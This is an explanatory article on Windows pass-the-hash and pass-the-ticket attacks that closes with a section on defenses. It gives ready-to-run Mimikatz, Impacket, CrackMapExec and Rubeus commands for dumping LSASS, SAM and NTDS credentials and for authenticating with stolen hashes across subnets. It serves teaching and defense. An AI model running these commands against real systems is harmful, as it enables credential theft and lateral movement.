# Pass-the-Hash

Pass-the-hash is one of those attacks that sounds like a trick when you first hear it, and then becomes obvious once you understand how NTLM authentication actually works. You don't crack the password. You don't need to. You take the hash and use it directly as the credential, because in NTLM's world, the hash and the password are functionally the same thing.

This single insight has shaped Windows enterprise security for decades. It's the reason Microsoft built Credential Guard. It's the reason "dump LSASS" is usually the first thing a Windows post-exploitation checklist includes. Understanding why it works requires understanding NTLM.

---

## How NTLM Authentication Works

When you authenticate to a Windows resource using NTLM, this is the exchange:

1. The client sends a "negotiate" message to the server, announcing it wants to authenticate.
2. The server responds with a **challenge**: a random 8-byte nonce.
3. The client takes that challenge and encrypts it using the NT hash of the user's password as the key (specifically, HMAC-MD5 in NTLMv2). This produces the **response**.
4. The server (or domain controller, for domain accounts) verifies the response by performing the same calculation with the stored hash and comparing results.

Notice what's happening in step 3: the hash itself is the key. The plaintext password is never used directly in the protocol. If you have the NT hash, you can compute a valid response to any challenge. You can authenticate as that user without ever knowing their password.

NTLMv1 is even weaker (DES-based, no HMAC), but NTLMv2 is the current version and it's still vulnerable to this. Pass-the-hash works against NTLMv2. It always has.

---

## Where Hashes Live

To pass a hash, you first need to obtain one. On Windows, there are several places they reside:

**LSASS (Local Security Authority Subsystem Service):** This is the most common source. LSASS is the process that handles authentication on Windows. It caches credentials for logged-in users in memory, including NTLM hashes and in some configurations, Kerberos tickets and even plaintext passwords. Any user who has logged on interactively or via RDP (in older or misconfigured environments) may have their hash sitting in LSASS.

**SAM Database:** The Security Account Manager stores hashed passwords for local accounts. Located at `C:\Windows\System32\config\SAM`. It's locked by the OS while Windows is running, but you can pull it via registry export or by reading the raw volume.

**NTDS.dit:** The Active Directory database, stored on every domain controller at `C:\Windows\NTDS\ntds.dit`. Contains hashed credentials for every domain account. This is the crown jewel. If you get this file and the SYSTEM hive (for the boot key to decrypt it), you have every user's hash in the domain.

---

## Extracting Hashes

### Mimikatz

Mimikatz is the tool most closely associated with this attack class. Written by Benjamin Delpy, it can read directly from LSASS memory and extract hashes (and sometimes cleartext passwords from WDigest, when that's enabled).

```
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords
```

`privilege::debug` requests the SeDebugPrivilege, which allows reading other processes' memory. It requires local admin. `sekurlsa::logonpasswords` then reads LSASS and dumps everything it finds: NT hashes, NTLM hashes, Kerberos tickets, and plaintext credentials where available.

For the local SAM:
```
mimikatz # lsadump::sam
```

For domain credentials from NTDS.dit (run on a DC or with DC privileges):
```
mimikatz # lsadump::dcsync /domain:corp.local /all /csv
```

`dcsync` is particularly elegant: it doesn't read files at all. It uses the legitimate Directory Replication Service (DRS) protocol to request that the DC "replicate" account data to you, as if you were another DC. Requires Domain Admin or equivalent privileges, but leaves a much smaller footprint than accessing NTDS.dit directly.

### Impacket's secretsdump.py

Impacket is a Python library for working with Windows network protocols. `secretsdump.py` can pull hashes remotely if you have admin credentials:

```bash
# Remote hash dump via SMB/DCE-RPC
secretsdump.py domain/admin:password@10.10.10.5

# Using an existing hash (this is itself a PTH operation)
secretsdump.py -hashes :NThashhere domain/admin@10.10.10.5

# Offline: extract from files
secretsdump.py -ntds ntds.dit -system SYSTEM LOCAL
```

### Meterpreter hashdump

```
meterpreter > hashdump
```

Dumps the local SAM database. Requires SYSTEM-level access. For domain hashes, you'd need to be on a DC or use a post module.

---

## Using the Hash

Once you have an NT hash, here's how you actually use it.

### Impacket Tools

The Impacket suite has several tools that accept hashes directly. The format is always `LMhash:NThash`. Since LM hashing is effectively disabled on modern Windows, the LM portion is usually left as `aad3b435b51404eeaad3b435b51404ee` (the hash of an empty string) or just left blank with a leading colon.

```bash
# psexec: spawns a shell via SMB, creates a service
psexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c domain/administrator@10.10.10.5

# wmiexec: executes commands via WMI, stealthier than psexec
wmiexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c domain/administrator@10.10.10.5

# smbexec: similar to psexec but different service-based approach
smbexec.py -hashes :8846f7eaee8fb117ad06bdd830b7586c domain/administrator@10.10.10.5

# SMB share access
smbclient.py -hashes :8846f7eaee8fb117ad06bdd830b7586c domain/administrator@10.10.10.5
```

### CrackMapExec

CME is excellent for lateral movement across multiple hosts:

```bash
# Test hash against a range of hosts
crackmapexec smb 10.10.10.0/24 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c

# Execute a command
crackmapexec smb 10.10.10.5 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c -x whoami

# Dump SAM on all hosts where the hash works
crackmapexec smb 10.10.10.0/24 -u administrator -H 8846f7eaee8fb117ad06bdd830b7586c --sam
```

CME will mark successful authentications with `[+]` and tag domain admin hits with `(Pwn3d!)`. Running a domain admin hash across an entire subnet and watching everything light up is a memorable experience, though perhaps not for the right reasons.

### Mimikatz sekurlsa::pth

On Windows, Mimikatz can spawn a new process with the stolen hash loaded as the credential material:

```
mimikatz # sekurlsa::pth /user:administrator /domain:corp.local /ntlm:8846f7eaee8fb117ad06bdd830b7586c /run:cmd.exe
```

This opens a cmd.exe that will authenticate as the target user for any NTLM-based network access.

---

## Pass-the-Ticket (A Brief Note)

Kerberos doesn't use NTLM, but it has an analogous attack. Instead of hashes, you steal Kerberos tickets (TGTs or TGSs) from memory and inject them into your current session. The stolen ticket authenticates you to the relevant services without needing the account's password.

```bash
# Export tickets from memory (Mimikatz)
mimikatz # sekurlsa::tickets /export

# Inject a ticket (Mimikatz)
mimikatz # kerberos::ptt ticket.kirbi

# Rubeus (more modern tooling)
Rubeus.exe dump
Rubeus.exe ptt /ticket:base64tickethere
```

The key distinction: TGTs are more powerful (they can be used to request service tickets for anything), while TGSs are scoped to a specific service. If you get a TGT, you effectively have the account's access. This is the basis of Golden Ticket and Silver Ticket attacks, which are covered in the Kerberos post.

---

## Why This Attack Is So Powerful

The real impact isn't just that it works. It's the combination of factors:

**No cracking required.** A 30-character random password is just as useful to an attacker as `password123` if they have the hash. Password complexity is irrelevant once hashes are exposed.

**Lateral movement at scale.** If a local administrator account uses the same password across every machine in the environment (historically very common before LAPS), one hash gives you every machine. CME can validate this across a /16 in minutes.

**Chaining to domain admin.** You don't need to start with domain admin credentials. If a domain admin has ever logged on interactively to a compromised machine, their hash may be in LSASS. Workstation to domain admin in one dump.

**Persistence.** Hashes don't change unless passwords change. A hash obtained today may still be valid in six months if no forced rotation has occurred.

---

## Defenses

**Protected Users Security Group (Windows Server 2012 R2+):** Adding accounts to this group enforces several credential hardening measures, including disabling NTLM authentication for those accounts entirely, preventing credential caching, and limiting Kerberos ticket lifetimes. Putting privileged accounts here is one of the most impactful things you can do.

**Windows Defender Credential Guard:** Uses virtualization-based security (VBS) to isolate LSASS in a separate virtual trust level. Even with SYSTEM privileges, you can't directly read the isolated credential material. This is the most effective technical control against PTH. Requires Windows 10/Server 2016 and appropriate hardware, and some legacy applications break with it enabled.

**Disable NTLM where possible:** If your environment is fully Kerberos-capable, you can restrict or block NTLM authentication via Group Policy. This is harder to achieve in practice than it sounds because many applications still fall back to NTLM, but it's worth auditing.

**Local Administrator Password Solution (LAPS):** Randomizes and rotates local administrator passwords on domain-joined machines, stored securely in Active Directory. Eliminates the "one hash works everywhere" scenario for local admin accounts.

**Least privilege:** Limit who can log on interactively (or via RDP) to sensitive systems. The fewer privileged accounts that touch a given machine, the fewer hashes are available in its LSASS. Tier your admin model: tier-0 accounts (DAs) should only log on to tier-0 systems (DCs).

**Patch aggressively:** Several privilege escalation vulnerabilities (MS14-068, various NTLM relay CVEs) can amplify PTH-class attacks. Staying current closes these amplification paths.

None of these controls are a silver bullet. Credential Guard can be disabled with a reboot on an unattended physical machine. NTLM can't always be fully disabled. But layering them significantly raises the cost and complexity for an attacker trying to move laterally.
